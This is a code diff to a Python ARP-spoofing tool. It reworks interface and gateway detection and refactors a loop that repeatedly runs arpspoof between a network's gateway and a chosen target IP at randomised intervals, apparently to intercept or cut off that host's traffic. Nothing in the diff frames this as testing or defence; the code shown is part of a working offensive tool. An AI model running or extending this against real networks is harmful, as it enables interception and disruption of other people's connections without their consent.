@@ -54,9 +54,6 @@ class interface(object):
 	def __init__(self, interface: str):
 		self.interface = interface
 		self.gateway = ''
-		n = netifaces.ifaddresses(interface)
-		self.ip = n[netifaces.AF_INET][0]['addr']
-		self.netmask = n[netifaces.AF_INET][0]['netmask']
 		n = netifaces.gateways()
 		for m in n[netifaces.AF_INET]:
 			if m[1] == interface:
@@ -65,7 +62,11 @@ class interface(object):
 		if self.gateway == '':
 			print(interface)
 			print(n)
-			raise ValueError('Gateway IP error')
+			print('Fail to get gateway ip in {}, ignored.'.format(interface))
+			return
+		n = netifaces.ifaddresses(interface)
+		self.ip = n[netifaces.AF_INET][0]['addr']
+		self.netmask = n[netifaces.AF_INET][0]['netmask']
 		self.base = self._get_base(self.netmask)
 		self.search_ip = self._get_search_ip()
 	@staticmethod
@@ -83,7 +84,6 @@ class interface(object):
 		
 class arpcfg(object):
 	def __init__(self, cfgstr: str):
-		print(cfgstr)
 		self.ip, self.mac, self.interface, self.gateway = cfgstr.split('\\n')
 
 class arp_class(object):
@@ -115,7 +115,7 @@ class arp_class(object):
 				self.target_interface = l
 				break
 	def search_mac(self):
-		l = [item for _, item in self.interfaces.items()]
+		l = [item for _, item in self.interfaces.items() if hasattr(item, 'base')]
 		l.sort(key = operator.attrgetter('base'), reverse = True)
 		for x in l:
 			self.search_child(x)
@@ -161,9 +161,13 @@ class arp_class(object):
 	def main_activity(self):
 		while True:
 			try:
-				printl('Start spoof')
-				ctrlsub.runable(['arpspoof', '-i', self.target_interface.interface, '-t', self.target_interface.gateway, '-r', self.ip], self.get_rand_sleep(), exit_msg = 'Wait arpspoof to exit (fix connection)')
-				printl('Stopped')
+				ctrlsub.runable(
+					['arpspoof', '-i', self.target_interface.interface, '-t', self.target_interface.gateway, '-r', self.ip],
+					self.get_rand_sleep(),
+					start_msg = 'Start spoof',
+					exit_msg = 'Wait arpspoof to exit (fix connection)',
+					after_wait_msg = 'Stopped'
+				)
 				time.sleep(self.get_rand_interval())
 			except KeyboardInterrupt:
 				while True:
@@ -179,7 +183,7 @@ class arp_class(object):
 				print(self.ip, self.mac, self.interfaces)
 				traceback.print_exc()
 	def get_rand_sleep(self):
-		return self.blocktime if self.randomtime == 0 else self.blocktime + random.randint(-self.blocktime, self.blocktime)
+		return self.blocktime if self.randomtime == 0 else self.blocktime + random.randint( -self.blocktime + 2 , self.blocktime)
 	def get_rand_interval(self):
 		return self.interval if self.randomtime == 0 else self.interval + random.randint(-self.randomtime, self.randomtime)
 
